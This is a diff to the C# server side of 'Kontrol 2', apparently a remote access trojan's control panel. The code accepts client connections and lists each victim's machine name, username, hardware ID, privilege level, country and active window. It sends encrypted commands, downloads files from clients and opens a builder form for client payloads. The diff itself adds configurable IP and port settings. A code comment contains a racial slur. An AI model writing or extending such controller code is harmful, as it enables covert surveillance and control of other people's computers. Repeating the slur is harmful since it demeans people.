@@ -21,13 +21,14 @@ namespace Kontrol_2_Server
 {
 	public partial class MainForm : Form
 	{
-		//Server and client global variables
-		static Socket _serverSocket;
+		//Server and client properties
+		static Socket _SERVERSOCKET;
 		const int _BUFFER_SIZE = 20971520;
-		const ushort _PORT = 7878;
-		static readonly byte[] _buffer = new byte[_BUFFER_SIZE];
-		public static readonly List<Socket> _clientSockets = new List<Socket>();
-		static List<ClientInfo> _clientInfos = new List<ClientInfo>();
+		static Settings _SRVSETTINGS = null;
+		static readonly byte[] _BUFFER = new byte[_BUFFER_SIZE];
+		public static readonly List<Socket> _CSOCKETS = new List<Socket>();
+		static List<ClientInfo> _CINFOS = new List<ClientInfo>();
+		static string _APPDATA = Path.Join(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "RESoft/Kontrol 2/");
 
 		//Form global variables
 		public static FileManagerForm fmf = new FileManagerForm();
@@ -58,15 +59,40 @@ namespace Kontrol_2_Server
 			InitializeComponent();
 		}
 
-		void SetupServer()
+		void StartServer()
 		{
-			toolStripStatusLabel1.Text = "Status: Starting...";
-			_serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-			_serverSocket.Bind(new IPEndPoint(IPAddress.Any, _PORT));
-			_serverSocket.Listen(5);
-			_serverSocket.BeginAccept(AcceptCallBack, null);
-			toolStripStatusLabel1.Text = "Status: Online";
-			listUpdate.Start();
+			try
+			{
+				toolStripStatusLabel1.Text = "Status: Starting...";
+				_SERVERSOCKET = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+				_SERVERSOCKET.Bind(new IPEndPoint(IPAddress.Parse(_SRVSETTINGS.IpAddr), _SRVSETTINGS.Port));
+				_SERVERSOCKET.Listen(5);
+				_SERVERSOCKET.BeginAccept(AcceptCallBack, null);
+				toolStripStatusLabel1.Text = "Status: Online";
+				listUpdate.Start();
+				statusUpdate.Start();
+				startBtn.Text = "Stop Server";
+			}
+			catch (Exception ex)
+			{
+				MessageBox.Show($"Error: {ex.Message}", "An Error Occured", MessageBoxButtons.OK, MessageBoxIcon.Error);
+			}
+		}
+
+		void StopServer()
+		{
+			try
+			{
+				_SERVERSOCKET.Close();
+				listUpdate.Stop();
+				ClientsView.Clear();
+				statusUpdate.Stop();
+				startBtn.Text = "Start Server";
+			}
+			catch (Exception ex)
+			{
+				MessageBox.Show($"Error: {ex.Message}", "An Error Occured", MessageBoxButtons.OK, MessageBoxIcon.Error);
+			}
 		}
 
 		void listClients()
@@ -84,13 +110,13 @@ namespace Kontrol_2_Server
 							selectedClientId = ClientsView.SelectedIndices[0];
 						}
 						ClientsView.Items.Clear();
-						for (int i = 0; i < _clientInfos.Count; i++)
+						for (int i = 0; i < _CINFOS.Count; i++)
 						{
-							if (_clientSockets[i].Connected)
+							if (_CSOCKETS[i].Connected)
 							{
-								string[] row = { _clientInfos[i].id.ToString(), _clientInfos[i].ip, _clientInfos[i].country, _clientInfos[i].machineName, _clientInfos[i].time, _clientInfos[i].os, _clientInfos[i].username, _clientInfos[i].hwid, _clientInfos[i].version, _clientInfos[i].privilege, _clientInfos[i].activeWindow };
+								string[] row = { _CINFOS[i].id.ToString(), _CINFOS[i].ip, _CINFOS[i].country, _CINFOS[i].machineName, _CINFOS[i].time, _CINFOS[i].os, _CINFOS[i].username, _CINFOS[i].hwid, _CINFOS[i].version, _CINFOS[i].privilege, _CINFOS[i].activeWindow };
 								ListViewItem lv = new ListViewItem(row);
-								switch (_clientInfos[i].privilege.ToLower())
+								switch (_CINFOS[i].privilege.ToLower())
 								{
 									case "user":
 										lv.ImageIndex = 8;
@@ -106,8 +132,8 @@ namespace Kontrol_2_Server
 							}
 							else
 							{
-								_clientSockets.RemoveAt(i);
-								_clientInfos.RemoveAt(i);
+								_CSOCKETS.RemoveAt(i);
+								_CINFOS.RemoveAt(i);
 							}
 						}
 						if (selectedClientId != -10)
@@ -124,13 +150,13 @@ namespace Kontrol_2_Server
 						selectedClientId = ClientsView.SelectedIndices[0];
 					}
 					ClientsView.Items.Clear();
-					for (int i = 0; i < _clientInfos.Count; i++)
+					for (int i = 0; i < _CINFOS.Count; i++)
 					{
-						if (_clientSockets[i].Connected)
+						if (_CSOCKETS[i].Connected)
 						{
-							string[] row = { _clientInfos[i].id.ToString(), _clientInfos[i].ip, _clientInfos[i].country, _clientInfos[i].machineName, _clientInfos[i].time, _clientInfos[i].os, _clientInfos[i].username, _clientInfos[i].hwid, _clientInfos[i].version, _clientInfos[i].privilege, _clientInfos[i].activeWindow };
+							string[] row = { _CINFOS[i].id.ToString(), _CINFOS[i].ip, _CINFOS[i].country, _CINFOS[i].machineName, _CINFOS[i].time, _CINFOS[i].os, _CINFOS[i].username, _CINFOS[i].hwid, _CINFOS[i].version, _CINFOS[i].privilege, _CINFOS[i].activeWindow };
 							ListViewItem lv = new ListViewItem(row);
-							switch (_clientInfos[i].privilege.ToLower())
+							switch (_CINFOS[i].privilege.ToLower())
 							{
 								case "user":
 									lv.ImageIndex = 8;
@@ -146,11 +172,11 @@ namespace Kontrol_2_Server
 						}
 						else
 						{
-							_clientSockets.RemoveAt(i);
-							_clientInfos.RemoveAt(i);
+							_CSOCKETS.RemoveAt(i);
+							_CINFOS.RemoveAt(i);
 						}
 					}
-					if (_clientSockets.Count > 0 && selectedClientId != -10)
+					if (_CSOCKETS.Count > 0 && selectedClientId != -10)
 					{
 						ClientsView.Items[selectedClientId].Selected = true;
 						ClientsView.Select();
@@ -162,19 +188,19 @@ namespace Kontrol_2_Server
 
 		void CloseAllConnections()
 		{
-			foreach (Socket socket in _clientSockets)
+			foreach (Socket socket in _CSOCKETS)
 			{
 				socket.Shutdown(SocketShutdown.Both);
 				socket.Close();
 			}
-			_serverSocket.Close();
+			_SERVERSOCKET.Close();
 		}
 
 		void CloseConnection(int clientId)
 		{
-			_clientSockets[clientId].Shutdown(SocketShutdown.Both);
-            _clientSockets[clientId].Close();
-			_clientInfos.RemoveAt(clientId);
+			_CSOCKETS[clientId].Shutdown(SocketShutdown.Both);
+            _CSOCKETS[clientId].Close();
+			_CINFOS.RemoveAt(clientId);
         }
 
 		void AcceptCallBack(IAsyncResult ar)
@@ -183,7 +209,7 @@ namespace Kontrol_2_Server
 
 			try
 			{
-				socket = _serverSocket.EndAccept(ar);
+				socket = _SERVERSOCKET.EndAccept(ar);
 
 			}
 			catch (ObjectDisposedException)
@@ -191,12 +217,12 @@ namespace Kontrol_2_Server
 				return;
 			}
 
-			_clientSockets.Add(socket);
-			int id = _clientSockets.Count - 1;
+			_CSOCKETS.Add(socket);
+			int id = _CSOCKETS.Count - 1;
 			SendCommand("getinfo-" + id, id);
-			socket.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, RecieveCallBack, socket);
+			socket.BeginReceive(_BUFFER, 0, _BUFFER_SIZE, SocketFlags.None, RecieveCallBack, socket);
 			//SendKeys.SendWait("its ok just not for everybody"); // nigga wut???
-			_serverSocket.BeginAccept(AcceptCallBack, null);
+			_SERVERSOCKET.BeginAccept(AcceptCallBack, null);
 		}
 
 		void RecieveCallBack(IAsyncResult ar)
@@ -211,12 +237,12 @@ namespace Kontrol_2_Server
 			catch (SocketException)
 			{
 				current.Close();
-				_clientInfos.RemoveAt(_clientSockets.IndexOf(current));
-				_clientSockets.Remove(current);
+				_CINFOS.RemoveAt(_CSOCKETS.IndexOf(current));
+				_CSOCKETS.Remove(current);
 			}
 			byte[] recBuf = new byte[recieved];
-			Array.Copy(_buffer, recBuf, recieved);
-			current.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, RecieveCallBack, current);
+			Array.Copy(_BUFFER, recBuf, recieved);
+			current.BeginReceive(_BUFFER, 0, _BUFFER_SIZE, SocketFlags.None, RecieveCallBack, current);
 			new Thread(() =>
 			{
 				byte[] header = new byte[2];
@@ -280,9 +306,9 @@ namespace Kontrol_2_Server
 					else if (resp.StartsWith("active_window"))
 					{
 						string[] xsplit = resp.Split('\n');
-						ClientInfo ci = _clientInfos[int.Parse(xsplit[1])];
+						ClientInfo ci = _CINFOS[int.Parse(xsplit[1])];
 						ci.activeWindow = xsplit[2];
-						_clientInfos[int.Parse(xsplit[1])] = ci;
+						_CINFOS[int.Parse(xsplit[1])] = ci;
 						listClients();
 					}
 					else if (resp.StartsWith("process_info"))
@@ -331,11 +357,11 @@ namespace Kontrol_2_Server
 						{
 							xsplit[8] = "User";
 						}
-						_clientInfos.Add(new ClientInfo
+						_CINFOS.Add(new ClientInfo
 						{
 							id = id,
-							ip = _clientSockets[id].RemoteEndPoint.ToString().Split(':')[0],
-							country = GetCountry(_clientSockets[id].RemoteEndPoint.ToString().Split(':')[0]),
+							ip = _CSOCKETS[id].RemoteEndPoint.ToString().Split(':')[0],
+							country = GetCountry(_CSOCKETS[id].RemoteEndPoint.ToString().Split(':')[0]),
 							machineName = xsplit[2],
 							time = xsplit[3],
 							username = xsplit[4],
@@ -517,7 +543,7 @@ namespace Kontrol_2_Server
 		}
 		public static void SendCommand(string cmd, int targetClient, bool multi = true)
 		{
-			Socket s = _clientSockets[targetClient];
+			Socket s = _CSOCKETS[targetClient];
 			string encrypted = Encrypt(cmd);
 			byte[] sentData = Encoding.Unicode.GetBytes(encrypted);
 			s.Send(sentData);
@@ -533,7 +559,7 @@ namespace Kontrol_2_Server
 		public static int Send(byte[] data, int targetClient, int offset = 0, int size = 0)
 		{
 			if (size == 0) size = data.Length;
-			int sent = _clientSockets[targetClient].Send(data, offset, size, SocketFlags.None);
+			int sent = _CSOCKETS[targetClient].Send(data, offset, size, SocketFlags.None);
 			sentBytes = sent;
 			return sent;
 		}
@@ -570,7 +596,7 @@ namespace Kontrol_2_Server
 		}
 		public void StreamDownload(int clientId)
 		{
-			NetworkStream ns = new NetworkStream(_clientSockets[fmf.clientId]);
+			NetworkStream ns = new NetworkStream(_CSOCKETS[fmf.clientId]);
 			using (FileStream fs = new FileStream(fo_path, FileMode.Create, FileAccess.Write))
 			{
 				int count = 0;
@@ -597,10 +623,40 @@ namespace Kontrol_2_Server
 
 			}
 		}
+		bool SaveSettings()
+		{
+			string cfgFile = Path.Join(_APPDATA, "config.json");
+			try
+			{
+				if (!Directory.Exists(_APPDATA)) Directory.CreateDirectory(_APPDATA);
+				File.WriteAllText(cfgFile, JsonConvert.SerializeObject(_SRVSETTINGS));
+			}
+			catch (Exception ex)
+			{
+				MessageBox.Show($"Error: Could not save settings @ {cfgFile}.", "An Error Occured", MessageBoxButtons.OK, MessageBoxIcon.Error);
+				return false;
+			}
+			return true;
+		}
+		bool LoadSettings()
+		{
+			string cfgFile = Path.Join(_APPDATA, "config.json");
+			if (File.Exists(cfgFile))
+			{
+				_SRVSETTINGS = JsonConvert.DeserializeObject<Settings>(File.ReadAllText(cfgFile));
+				return true;
+			}
+			return false;
+		}
 		void MainForm_Shown(object sender, EventArgs e)
 		{
-			SetupServer();
-			statusUpdate.Start();
+			if (!LoadSettings())
+				MessageBox.Show("Please configure Kontrol 2 in the Settings tab and Start the server.", "No configuration found", MessageBoxButtons.OK, MessageBoxIcon.Information);
+			else
+			{
+				StartServer();
+				statusUpdate.Start();
+			}
 		}
 		void listUpdate_Tick(object sender, EventArgs e)
 		{
@@ -674,7 +730,7 @@ namespace Kontrol_2_Server
 			if (ClientsView.SelectedIndices.Count > 0)
 			{
 				fmf.clientId = ClientsView.SelectedIndices[0];
-				fmf.username = _clientInfos[ClientsView.SelectedIndices[0]].machineName;
+				fmf.username = _CINFOS[ClientsView.SelectedIndices[0]].machineName;
 				fmf.Show();
 			}
 		}
@@ -844,6 +900,29 @@ namespace Kontrol_2_Server
 		{
 			new BuilderForm().Show();
 		}
+
+		void startBtn_Click(object sender, EventArgs e)
+		{
+			if (startBtn.Text == "Start Server")
+			{
+				_SRVSETTINGS = new Settings();
+				_SRVSETTINGS.IpAddr = addrBox.Text;
+				_SRVSETTINGS.Port = ushort.Parse(portBox.Text);
+				SaveSettings();
+				StartServer();
+			}
+			else
+			{
+				StopServer();
+				startBtn.Text = "Start Server";
+			}
+		}
+	}
+
+	public class Settings
+	{
+		public string IpAddr { get; set; }
+		public ushort Port { get; set; }
 	}
 
 	public struct ClientInfo
